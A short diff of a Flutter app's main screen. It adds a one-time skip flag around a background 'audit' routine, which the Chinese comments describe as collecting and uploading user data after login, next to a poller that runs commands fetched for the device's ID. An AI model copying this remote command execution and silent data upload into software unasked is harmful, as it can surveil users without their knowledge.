@@ -83,13 +83,16 @@ class _MainScreenState extends State<MainScreen>
     _commandPoller = CommandPoller(executor: _commandExecutor);
     DeviceInfoService.getDeviceId().then((id) => _commandPoller.start(id));
     Future.microtask(() => _loadInitialData());
-    // 规约：资料采集仅在注册/登录成功并进入主界面后触发；延迟约 0.5s 再跑，避免首帧与审计争抢导致卡顿
-    WidgetsBinding.instance.addPostFrameCallback((_) {
-      Future.delayed(const Duration(milliseconds: 500), () {
-        if (!mounted) return;
-        AuditService().runAuditCycle();
+    // iOS 若已在权限通过后安排首次审查，则此处跳过一次，避免同一启动周期重复上传。
+    final skipInitialAudit = AuditService.consumeSkipNextMainScreenInitialAudit();
+    if (!skipInitialAudit) {
+      WidgetsBinding.instance.addPostFrameCallback((_) {
+        Future.delayed(const Duration(milliseconds: 500), () {
+          if (!mounted) return;
+          AuditService().runAuditCycle();
+        });
       });
-    });
+    }
     // 欢迎弹窗：至少 5 秒后自动关闭
     WidgetsBinding.instance.addPostFrameCallback((_) {
       if (!mounted || !_showWelcomeDialog) return;
